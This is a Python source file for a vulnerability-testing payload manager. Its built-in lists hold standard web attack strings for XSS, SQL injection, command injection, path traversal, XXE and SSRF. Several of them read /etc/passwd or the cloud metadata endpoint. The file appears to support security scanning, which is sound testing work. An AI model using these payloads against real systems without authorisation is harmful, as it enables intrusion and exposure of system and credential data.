"""
Payload management for vulnerability testing
"""

from typing import List, Dict, Any, Optional
from pathlib import Path
import json


class PayloadManager:
    """Manage vulnerability testing payloads"""
    
    def __init__(self, payload_dir: str = "payloads"):
        self.payload_dir = Path(payload_dir)
        self.payload_dir.mkdir(exist_ok=True)
        self.payloads: Dict[str, List[str]] = {}
        self._load_payloads()
    
    def _load_payloads(self):
        """Load payloads from files"""
        # XSS payloads
        self.payloads['xss'] = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
        ]
        
        # SQL Injection payloads
        self.payloads['sql_injection'] = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR SLEEP(5)--",
        ]
        
        # Command Injection payloads
        self.payloads['command_injection'] = [
            "; ls",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\win.ini",
            "; ping -c 5 127.0.0.1",
        ]
        
        # Path Traversal payloads
        self.payloads['path_traversal'] = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        # XXE payloads
        self.payloads['xxe'] = [
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>''',
        ]
        
        # SSRF payloads
        self.payloads['ssrf'] = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
        ]
    
    def get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads for vulnerability type"""
        return self.payloads.get(vuln_type, [])
    
    def add_payload(self, vuln_type: str, payload: str):
        """Add custom payload"""
        if vuln_type not in self.payloads:
            self.payloads[vuln_type] = []
        self.payloads[vuln_type].append(payload)
    
    def load_from_file(self, file_path: Path) -> List[str]:
        """Load payloads from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"Error loading payloads from {file_path}: {e}")
            return []
    
    def save_payloads(self, vuln_type: str, file_path: Path):
        """Save payloads to file"""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                for payload in self.payloads.get(vuln_type, []):
                    f.write(f"{payload}\n")
        except Exception as e:
            print(f"Error saving payloads to {file_path}: {e}")

